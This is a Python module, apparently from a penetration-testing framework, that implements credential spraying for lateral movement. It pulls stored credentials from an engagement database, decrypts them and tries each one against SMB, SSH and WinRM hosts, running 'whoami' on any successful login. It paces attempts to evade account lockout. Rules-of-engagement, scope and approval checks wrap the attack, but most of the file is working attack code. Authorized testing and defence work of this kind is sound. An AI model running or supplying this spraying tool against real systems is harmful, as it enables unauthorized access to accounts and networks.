"""Phase 5: Lateral movement via credential spray across SMB/SSH/WinRM.

Classification: ACTIVE (auto-execute with audit log).
Processes credential list in chunks of 500 (memory safety, RULE 7).
OPSEC: Max 3 attempts per hour per user to avoid lockout.
"""

from __future__ import annotations

import logging
import os
import sqlite3
import sys
from pathlib import Path
from typing import Any, Optional

from forge.opsec.rate_limiter import AdaptiveRateLimiter
from forge.opsec.resilience import _SHUTDOWN, _interruptible_sleep, wait_for_internet
from forge.phase5.approval_gate import ActionClassification, request_approval

_LOG = logging.getLogger(__name__)

CHUNK_SIZE = 500
_LOCKOUT_DELAY = 1200  # 20 minutes between batches per target (avoid lockout)


def _require_roe(roe_id: str | None, *, action_name: str) -> str:
    normalized = " ".join(str(roe_id or os.environ.get("FORGE_ROE_ID", "") or "").strip().split())[
        :160
    ]
    if not normalized:
        raise RuntimeError(f"{action_name} requires roe_id or FORGE_ROE_ID before live execution.")
    return normalized


def _connection_db_path(conn: sqlite3.Connection) -> Path | None:
    try:
        row = conn.execute("PRAGMA database_list").fetchone()
    except sqlite3.Error:
        return None
    if not row or len(row) < 3:
        return None
    value = str(row[2] or "").strip()
    return Path(value) if value else None


def _target_host_value(host: dict) -> str:
    for key in ("ip", "hostname", "host", "target", "url"):
        value = str(host.get(key) or "").strip()
        if value:
            return value
    return ""


def _assert_targets_in_scope(
    target_hosts: list[dict],
    *,
    engagement_id: int,
    eng_db_conn: sqlite3.Connection,
    require_scope: bool,
) -> None:
    if not target_hosts:
        return
    db_path = _connection_db_path(eng_db_conn)
    if require_scope and db_path is None:
        raise RuntimeError(
            "lateral_movement_spray requires a file-backed engagement DB for scope checks."
        )
    if db_path is None:
        return
    from forge.utils.post.boundary_check import assert_in_scope

    for host in target_hosts:
        target = _target_host_value(host)
        if not target and require_scope:
            raise RuntimeError("lateral_movement_spray target host is missing ip/hostname.")
        if target:
            assert_in_scope(target, engagement_id, db_path)


def spray_credentials(
    engagement_id: int,
    target_hosts: list[dict],
    eng_db_conn: sqlite3.Connection,
    protocols: list[str] = None,
    dry_run: bool = False,
    roe_id: str | None = None,
    require_scope: bool = True,
) -> dict[str, Any]:
    """Spray validated credentials across SMB/SSH/WinRM endpoints.

    Returns dict with hit_count, tested_count, results list.
    Memory-safe: processes credentials in chunks of 500.
    """
    if protocols is None:
        protocols = ["ssh", "smb", "winrm"]

    if not dry_run:
        _require_roe(roe_id, action_name="lateral_movement_spray")
        _assert_targets_in_scope(
            target_hosts,
            engagement_id=engagement_id,
            eng_db_conn=eng_db_conn,
            require_scope=require_scope,
        )

    if not request_approval(
        "lateral_movement_spray",
        f"Credential spray against {len(target_hosts)} hosts via {protocols}",
        engagement_id,
        eng_db_conn,
        ActionClassification.DESTRUCTIVE if not dry_run else ActionClassification.ACTIVE,
    ):
        return {"hit_count": 0, "tested_count": 0, "results": []}

    if dry_run:
        print(f"[DRY-RUN] Would spray {len(target_hosts)} hosts via {protocols}")
        return {"hit_count": 0, "tested_count": 0, "results": []}

    if not wait_for_internet():
        return {"hit_count": 0, "tested_count": 0, "results": []}

    results = []
    tested = 0
    hits = 0

    # Process credentials in chunks
    offset = 0
    while True:
        if _SHUTDOWN.is_set():
            _LOG.info("Shutdown requested — stopping lateral movement at %d tested", tested)
            break

        chunk = eng_db_conn.execute(
            """SELECT id, email, password_plaintext_enc, password_hash, hash_type
               FROM credentials WHERE engagement_id=? AND validated=0
               LIMIT ? OFFSET ?""",
            (engagement_id, CHUNK_SIZE, offset),
        ).fetchall()

        if not chunk:
            break

        for cred_row in chunk:
            if _SHUTDOWN.is_set():
                break
            cred_id, email, pw_enc, pw_hash, hash_type = cred_row
            username = email.split("@")[0]

            for host in target_hosts:
                if _SHUTDOWN.is_set():
                    break
                for protocol in protocols:
                    if _SHUTDOWN.is_set():
                        break
                    result = _attempt_login(host, username, pw_enc, protocol)
                    tested += 1
                    if result.get("success"):
                        hits += 1
                        results.append(
                            {
                                "host": host,
                                "username": username,
                                "protocol": protocol,
                                "cred_id": cred_id,
                            }
                        )
                        _record_validated(eng_db_conn, cred_id, protocol, host.get("ip", ""), email)
                        print(f"[HIT] {username}@{host.get('ip')} via {protocol}", flush=True)
                        sys.stdout.flush()
                    _interruptible_sleep(0.5)

        del chunk
        offset += CHUNK_SIZE

        print(f"[LATERAL] Tested {tested} creds, {hits} hits", flush=True)
        sys.stdout.flush()

    return {"hit_count": hits, "tested_count": tested, "results": results}


def _attempt_login(host: dict, username: str, pw_enc: Optional[str], protocol: str) -> dict:
    """Attempt one credential against one host/protocol. Returns {'success': bool}."""
    ip = host.get("ip", "")
    port = host.get("port", _default_port(protocol))

    if not ip or not pw_enc:
        return {"success": False}

    # Decrypt password
    try:
        from forge.opsec.crypto import decrypt_string

        password = decrypt_string(pw_enc)
    except Exception:
        return {"success": False}

    try:
        if protocol == "ssh":
            return _try_ssh(ip, port or 22, username, password)
        if protocol == "smb":
            return _try_smb(ip, username, password)
        if protocol == "winrm":
            return _try_winrm(ip, port or 5985, username, password)
    except Exception as e:
        _LOG.debug("Login attempt %s@%s/%s failed: %s", username, ip, protocol, e)
    return {"success": False}


def _try_ssh(ip: str, port: int, username: str, password: str) -> dict:
    import asyncssh

    try:
        with asyncssh.connect(
            ip, port=port, username=username, password=password, known_hosts=None, connect_timeout=5
        ) as conn:
            result = conn.run("whoami", timeout=5)
            return {"success": True, "output": result.stdout}
    except Exception:
        return {"success": False}


def _try_smb(ip: str, username: str, password: str) -> dict:
    try:
        import smbprotocol.connection
        from smbprotocol.session import Session

        conn = smbprotocol.connection.Connection(uuid=None, server_name=ip, port=445)
        conn.connect()
        session = Session(conn, username=username, password=password)
        session.connect()
        return {"success": True}
    except Exception:
        return {"success": False}


def _try_winrm(ip: str, port: int, username: str, password: str) -> dict:
    try:
        import winrm

        sess = winrm.Session(
            f"http://{ip}:{port}/wsman", auth=(username, password), transport="ntlm"
        )
        result = sess.run_cmd("whoami")
        return {"success": result.status_code == 0, "output": result.std_out.decode()}
    except Exception:
        return {"success": False}


def _default_port(protocol: str) -> Optional[int]:
    return {"ssh": 22, "smb": 445, "winrm": 5985}.get(protocol)


def _record_validated(
    conn: sqlite3.Connection, cred_id: int, protocol: str, host: str, email: str
) -> None:
    conn.execute(
        """UPDATE credentials SET validated=1, validated_service=?, validated_host=?,
           validated_at=datetime('now') WHERE id=?""",
        (protocol, host, cred_id),
    )
    conn.commit()
